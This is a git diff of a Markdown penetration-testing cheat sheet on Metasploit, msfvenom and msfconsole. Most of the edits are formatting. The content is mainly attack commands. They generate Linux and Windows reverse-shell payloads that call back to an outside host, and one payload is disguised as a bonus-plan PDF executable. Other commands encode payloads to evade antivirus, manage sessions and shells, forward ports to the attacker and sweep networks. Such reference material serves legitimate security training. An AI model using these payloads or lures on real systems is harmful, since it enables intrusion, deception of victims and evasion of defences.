@@ -2,7 +2,7 @@
 
 ## <mark style="color:yellow;">ABOUT</mark>
 
-The `Metasploit Project` is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The `Metasploit Framework` includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the `Metasploit Project` is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development. Files usually located at `/usr/share/metasploit-framework`.
+<mark style="color:red;">**Metasploit Project**</mark> is a Ruby-based, <mark style="color:purple;">**modular penetration testing platform**</mark> that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The <mark style="color:green;">`Metasploit Framework`</mark> includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the <mark style="color:green;">`Metasploit Project`</mark> is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development. Files usually located at <mark style="color:green;">`/usr/share/metasploit-framework`</mark>.
 
 * **What is MS Module?** A module is a piece of software that the Metasploit Framework uses to perform a task, such as exploiting or scanning a target. A module can be an exploit module, auxiliary module, or post-exploitation module.
 
@@ -12,27 +12,27 @@ The `Metasploit Project` is a Ruby-based, modular penetration testing platform t
 2. <mark style="color:blue;">**Encoders**</mark> - Will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
 3. <mark style="color:blue;">**Evasion**</mark> - While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
 4. <mark style="color:blue;">**Exploits**</mark> - Exploits, neatly organized by target system.
-5. <mark style="color:blue;">**NOPs**</mark> - `(No Operation code)` Keep the payload sizes consistent across exploit attempts.
+5. <mark style="color:blue;">**NOPs**</mark> - <mark style="color:blue;">`(No Operation code)`</mark> Keep the payload sizes consistent across exploit attempts.
 6. <mark style="color:blue;">**Payloads**</mark> - Payloads are codes that will run on the target system.
 7. <mark style="color:blue;">**Post**</mark> - Post modules would be useful in post-exploitation.
 
 ## <mark style="color:yellow;">MSFVENOM</mark>
 
-**Msfvenom is a tool that is part of the Metasploit framework and it is a command line tool for generating different types of payloads for exploiting.** In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt & encode` payloads to bypass common anti-virus detection signatures.
+<mark style="color:red;">**Msfvenom**</mark> is a tool that is part of the Metasploit framework and it is a command line <mark style="color:purple;">**tool for generating different types of payloads for exploiting**</mark>**.** In addition to providing a payload with flexible delivery options, MSFvenom also allows us to **encrypt & encode** payloads to bypass common anti-virus detection signatures.
 
-* **List Payloads**
+#### **List Payloads**
 
 ```bash
 msfvenom -l payloads
 ```
 
-* **Building a Stageless Payload for Linux**
+#### **Building a Stageless Payload for Linux**
 
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f elf > createbackup.elf
 ```
 
-* **Building a Stageless Payload for Windows**
+#### **Building a Stageless Payload for Windows**
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
@@ -70,25 +70,25 @@ msf-virustotal -k <API key> -f TeamViewerInstall.exe
 
 ### <mark style="color:blue;">Sessions</mark>
 
-* **Listing Active Sessions**
+#### **Listing Active Sessions**
 
 ```bash
 msf6 exploit(windows/smb/goose) > sessions
 ```
 
-* **Interacting with a Session**
+#### **Interacting with a Session**
 
 ```bash
 msf6 exploit(windows/smb/goose) > sessions -i 1
 ```
 
-* **Getting shell**
+#### **Getting shell**
 
 ```bash
 msf6 exploit(windows/smb/goose) > shell
 ```
 
-* **Background session**
+#### **Background session**
 
 ```bash
 meterpreter > background
@@ -98,19 +98,19 @@ OR
 meterpreter > bg
 ```
 
-* **Killing session**
+#### **Killing session**
 
 ```bash
 msf6 exploit(windows/smb/goose) > sessions -k 1
 ```
 
-* **Listing Running Jobs**
+#### **Listing Running Jobs**
 
 ```bash
 msf6 exploit(multi/handler) > jobs -l
 ```
 
-* **Run an Exploit as a Background Job**
+#### **Run an Exploit as a Background Job**
 
 ```bash
 msf6 exploit(multi/handler) > exploit -j
@@ -166,25 +166,25 @@ meterpreter > portfwd add -R -l 1234 -p 4321 -L 13.13.13.13
 
 ## <mark style="color:yellow;">USEFUL MSFCONSOLE COMMANDS</mark>
 
-* **Specific Search**
+#### **Specific Search**
 
 ```bash
 msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
 ```
 
-* **Get more info about module**
+#### **Get more info about module**
 
 ```bash
 info
 ```
 
-* **Permanent Target Specification**
+#### **Permanent Target Specification**
 
 ```bash
 msf6 exploit(windows/smb/amogus) > setg RHOSTS 13.13.13.13
 ```
 
-* **Show and Set Target for exploit**
+#### **Show and Set Target for exploit**
 
 ```bash
 msf6 exploit(windows/browser/goose) > show targets
@@ -192,19 +192,19 @@ msf6 exploit(windows/browser/goose) > show targets
 msf6 exploit(windows/browser/goose) > set target 3
 ```
 
-* **Searching for Specific Payload**
+#### **Searching for Specific Payload**
 
 ```bash
 msf6 exploit(windows/smb/goose) > grep meterpreter grep reverse_tcp show payloads
 ```
 
-* **Use Local Exploit Suggester**
+#### **Use Local Exploit Suggester**
 
 ```bash
 msf6 > search local exploit suggester
 ```
 
-* **Ping Sweep**
+#### **Ping Sweep**
 
 ```bash
 run post/multi/gather/ping_sweep RHOSTS=13.13.13.0/23
